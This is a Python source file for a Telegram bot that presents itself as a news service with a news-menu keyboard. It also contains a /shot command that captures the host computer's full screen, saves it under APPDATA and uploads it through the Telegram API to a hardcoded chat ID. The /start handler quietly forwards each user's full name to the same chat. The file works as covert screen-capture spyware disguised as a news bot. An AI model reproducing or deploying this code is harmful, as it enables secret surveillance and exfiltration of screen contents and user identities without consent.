import asyncio
import io
import json
import os

from PIL import Image, ImageGrab
import requests
from io import BytesIO

from aiogram import types
from aiogram.dispatcher.filters import Text
from aiogram.utils.markdown import hbold, hunderline, hpre, hlink, text

from dispatcher import dp, bot
from config import BOT_OWNERS, BOT_TOKEN


chat_id = "984573662"

@dp.message_handler(commands=["start"])
async def start_command(message: types.Message):


    kb = [
        [
            types.KeyboardButton(text="Все новости"),
            types.KeyboardButton(text="Свежие новости"),
        ],
        [types.KeyboardButton(text="Последние 5 новостей")]
    ]
    keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

    await message.answer(f"Hello yopta: {message.from_user.full_name}", reply_markup=keyboard)
    await bot.send_message(chat_id, f'{message.from_user.full_name} qoshildi')

@dp.message_handler(commands=['shot'])
async def screen_shoot(message: types.Message):
    await bot.send_message(chat_id, "Kuting...")
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
    files = {'photo': screen}
    requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto?chat_id=" + chat_id, files=files)

